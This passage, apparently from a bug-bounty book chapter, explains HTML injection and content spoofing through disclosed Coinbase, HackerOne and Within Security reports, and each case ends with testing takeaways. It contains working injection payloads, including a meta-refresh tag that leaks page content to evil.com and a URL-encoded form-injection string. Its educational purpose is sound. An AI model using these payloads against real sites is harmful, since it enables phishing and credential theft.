HTML Injection
Description
Hypertext Markup Language (HTML) injection is also sometimes referred to as virtual  defacement. This is an attack made possible by a site allowing a malicious user
to inject HTML into its web page(s) by not handling that user’s input properly. In other words, an HTML injection vulnerability is caused by receiving HTML, typically via some
form input, which is then rendered as is on the page. This is separate and distinct from injecting Javascript, VBscript etc.

Since HTML is the language used to define the structure of a web page, if an attacker can inject HTML, they can essentially change what a browser renders. Sometimes this
could result in completely changing the look of a page or in other cases, creating forms to trick users. For example, if you could inject HTML, you might be able to add a <form> tag
to the page, asking the user to re-enter their username and password. However, when submitting this form, it actually sends the information to an attacker.

Description:
For this vulnerability, the reporter identified that Coinbase was actually decoding URI encoded values when rendering text. For those unfamiliar, characters in a URI are either reserved or unreserved. According to Wikipedia,reserved are characters that sometimes have special meaning like / and &. Unreserved characters are those without any special meaning, typically just letters.

So, when a character is URI encoded, it is converted into its byte value in the American Standard Code for Information Interchange (ASCII) and preceded with a percent sign (%). 
So, / becomes %2F, & becomes %26. As an aside, ASCII is a type of encoding which was most common on the internet until UTF-8 came along, another encoding type.

Example, if an attacker entered HTML like:
<h1>This is a test</h1>

Coinbase would actually render that as plain text, exactly as you see above. However, if the user submitted URL encoded characters, like:
%3C%68%31%3E%54%68%69%73%20%69%73%20%61%20%74%65%73%74%3C%2F%68%31%3E

Coinbase would actually decode that string and render the corresponding letters, or:
This is a test

With this, the reporting hacker demonstrated how he could submit an HTML form with username and password fields, which Coinbase would render. Had the hacker been
malicious, Coinbase could have rendered a form which submitted values back to a malicious website to capture credentials (assuming people filled out and submitted the
form).

Takeaways
When you’re testing out a site, check to see how it handles different types of input, including plain text and encoded text. Be on the lookout for sites that are
accepting URI encoded values like %2F and rendering their decoded values, in this case /. While we don’t know what the hacker was thinking in this example,
it’s possible they tried to URI encode restricted characters and noticed that Coinbase was decoding them. They then went one step further and URI encoded all characters.

A great URL Encoder is http://quick-encoder.com/url. You’ll notice using it that it will tell you unrestricted characters do not need encoding and give you the
option to encode url-safe characters anyway. That’s how you would get the same encoded string used on Coinbase.


2. HackerOne Unintended HTML Inclusion
Description:
After reading about the Yahoo! XSS (example 4 in Chapter 7) I became obsessed with testing HTML rendering in text editors. This included playing with HackerOne’s
Markdown editor, entering things like ismap= “yyy=xxx” and “‘test” inside of image tags. While doing so, I noticed that the editor would include a single quote within a double
quote - what is known as a hanging quote.At that time, I didn’t really understand the implications of this. I knew that if you injected another single quote somewhere, the two could
be parsed together by a browser which would see all content between them as one HTML element. For example:
<h1>This is a test</h1><p class="some class">some content</p>'

With this example, if you managed to inject a meta tag like:
<meta http-equiv="refresh" content='0; url=https://evil.com/log.php?text=

the browser would submit everything between the two single quotes. Now, turns out, this was known and disclosed in HackerOne report #1105783 by intidc (https://hackerone.com/intidc).
When that became public, my heart sank a little.

According to HackerOne, they rely on an implementation of Redcarpet (a Ruby library for Markdown processing) to escape the HTML output of any Markdown input which is then
passed directly into the HTML DOM (i.e., the web page) via dangerouslySetInnerHTML in their React component. As an aside, React is a Javascript library that can be used to
dynamically update a web page’s content without reloading the page. The DOM refers to an application program interface for valid HTML and well-formed XML documents. Essentially, according to Wikipedia, the DOM is a cross-platform and language independent convention for representing and interacting with objects in HTML,XHTML and XML documents.

In HackerOne’s implementation, they weren’t properly escaping the HTML output which
led to the potential exploit. Now, that said, seeing the disclosure, I thought I’d test out
the new code. I went back and tested out adding:

[test](http://www.torontowebsitedeveloper.com "test ismap="alert xss" yyy="test"\
")
which got turned into:
<a title="'test" ismap="alert xss" yyy="test" &#39; ref="http://www.toronotwebsi\
tedeveloper.com">test</a>
As you can see, I was able to inject a bunch of HTML into the <a> tag. As a result,
HackerOne rolled back the fix and began working on escaping single quote again.

Takeaways
Just because code is updated, doesn’t mean something is fixed. Test things out.
When a change is deployed, that also means new code which could contain bugs.
Additionally, if you feel like something isn’t right, keep digging! I knew the initial
trailing single quote could be a problem, but I didn’t know how to exploit it and
I stopped. I should have kept going. I actually learned about the meta refresh
exploit by reading XSS Jigsaw’s blog.innerht.ml (it’s included in the Resources
chapter) but much later.


3. Within Security Content Spoofing
Description:
Though content spoofing is technically a different type of vulnerability than HTML
injection, I’ve included it here as it shares the similar nature of an attacker having a site
rendered content of their choosing.
Within Security was built on the Wordpress platform which includes the login path
withinsecurity.com/wp-login.php (the site has since been merged with the HackerOne
core platform). A hacker noticed that during the login process, if an error occurred,
Within Security would render access_denied, which also corresponded to the error
parameter in the url:
https://withinsecurity.com/wp-login.php?error=access_denied

Noticing this, the hacker tried modifying the error parameter and found that whatever
value was passed was rendered by the site as part of the error message presented to
users. Here’s the example used:
https://withinsecurity.com/wp-login.php?error=Your%20account%20has%20%hacked

The key here was noticing the parameter in the URL being rendered on the page. Though
they don’t explain, I would assume the hacker noticed that access_denied was being
displayed on the page but was also included in the URL. A simple test changing the
access_denied parameter probably revealed the vulnerability in this case, which they
reported.

Takeaways
Keep an eye on URL parameters which are being passed and rendered as
site content. They may present opportunities for attackers to trick victims into
performing some malicious action.

Summary
HTML Injection presents a vulnerability for sites and developers because it can be used
to mislead users and trick them into submitting sensitive information to, or visiting,
malicious websites. Otherwise known as phishing attacks.

Discovering these vulnerabilities isn’t always about submitting plain HTML but exploring
how a site might render your inputted text, like URI encoded characters. And while not
entirely the same as HTML injection, content spoofing is similar in that it involves having
some input reflected back to a victim in the HTML page. Hackers should be on the lookout
for the opportunity to manipulate URL parameters and have them rendered on the site






